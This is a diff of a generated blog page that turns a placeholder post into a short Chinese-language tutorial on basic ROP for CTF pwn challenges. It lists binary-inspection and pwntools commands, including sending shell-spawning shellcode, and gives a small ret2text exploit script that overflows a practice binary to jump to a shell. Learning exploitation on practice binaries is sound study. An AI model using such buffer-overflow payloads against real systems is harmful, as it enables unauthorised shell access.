@@ -6,17 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="test">
+    <meta name="description" content="常用命令 函数名查询 ns binary | grep &amp;#39; t &amp;#39; GOT表 readelf --relocs binary PLT表 objdump -M intel -dj .plt binary 字符串 rabin2 -z binary rooper pipenv run ropper --file binary --search &amp;quot;xor&amp;quot;  pwnto">
 <meta property="og:type" content="article">
-<meta property="og:title" content="test">
+<meta property="og:title" content="基本ROP">
 <meta property="og:url" content="http://yoursite.com/2019/04/28/test/index.html">
 <meta property="og:site_name" content="Chace Blog">
-<meta property="og:description" content="test">
+<meta property="og:description" content="常用命令 函数名查询 ns binary | grep &amp;#39; t &amp;#39; GOT表 readelf --relocs binary PLT表 objdump -M intel -dj .plt binary 字符串 rabin2 -z binary rooper pipenv run ropper --file binary --search &amp;quot;xor&amp;quot;  pwnto">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-28T05:31:20.104Z">
+<meta property="og:updated_time" content="2019-04-29T09:41:48.651Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="test">
-<meta name="twitter:description" content="test">
+<meta name="twitter:title" content="基本ROP">
+<meta name="twitter:description" content="常用命令 函数名查询 ns binary | grep &amp;#39; t &amp;#39; GOT表 readelf --relocs binary PLT表 objdump -M intel -dj .plt binary 字符串 rabin2 -z binary rooper pipenv run ropper --file binary --search &amp;quot;xor&amp;quot;  pwnto">
     
     
         
@@ -36,7 +36,7 @@
         
     
     <!-- title -->
-    <title>test</title>
+    <title>基本ROP</title>
     <!-- styles -->
     <link rel="stylesheet" href="/css/style.css">
     <!-- persian styles -->
@@ -85,20 +85,20 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/04/28/test/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/04/28/test/&text=test"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/04/28/test/&is_video=false&description=test"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=test&body=Check out this article: http://yoursite.com/2019/04/28/test/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/04/28/test/&name=test&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/04/28/test/&text=基本ROP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/04/28/test/&is_video=false&description=基本ROP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基本ROP&body=Check out this article: http://yoursite.com/2019/04/28/test/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/04/28/test/&name=基本ROP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用命令"><span class="toc-number">1.</span> <span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools相关"><span class="toc-number">1.1.</span> <span class="toc-text">pwntools相关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础ROP"><span class="toc-number">2.</span> <span class="toc-text">基础ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">2.1.</span> <span class="toc-text">ret2text</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -110,7 +110,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        test
+        基本ROP
     </h1>
 
 
@@ -132,8 +132,19 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>test</p>
-
+    <h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
+<li>函数名查询 <code>ns binary | grep &#39; t &#39;</code></li>
+<li>GOT表 <code>readelf --relocs binary</code></li>
+<li>PLT表 <code>objdump -M intel -dj .plt binary</code></li>
+<li>字符串 <code>rabin2 -z binary</code></li>
+<li>rooper <code>pipenv run ropper --file binary --search &quot;xor&quot;</code></li>
+</ul>
+<h3 id="pwntools相关"><a href="#pwntools相关" class="headerlink" title="pwntools相关"></a>pwntools相关</h3><p><code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)</code></p>
+<p><code>gdb.attach(sh,&#39;b *0xbb&#39;)</code></p>
+<p><code>r.sendline(asm(shellcraft.sh()))</code></p>
+<h2 id="基础ROP"><a href="#基础ROP" class="headerlink" title="基础ROP"></a>基础ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>简单来说就是跳转到程序本身已有的代码，程序中如果有调用system(“/bin/sh”)的代码，直接将函数返回地址覆盖为目标地址。算偏移量可以使用<code>pattern offset</code>。</p>
+<p>一个样例payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
   </div>
 </article>
 
@@ -157,21 +168,21 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用命令"><span class="toc-number">1.</span> <span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools相关"><span class="toc-number">1.1.</span> <span class="toc-text">pwntools相关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础ROP"><span class="toc-number">2.</span> <span class="toc-text">基础ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">2.1.</span> <span class="toc-text">ret2text</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/04/28/test/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/04/28/test/&text=test"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/04/28/test/&is_video=false&description=test"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=test&body=Check out this article: http://yoursite.com/2019/04/28/test/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/04/28/test/&title=test"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/04/28/test/&name=test&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/04/28/test/&text=基本ROP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/04/28/test/&is_video=false&description=基本ROP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基本ROP&body=Check out this article: http://yoursite.com/2019/04/28/test/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/04/28/test/&title=基本ROP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/04/28/test/&name=基本ROP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
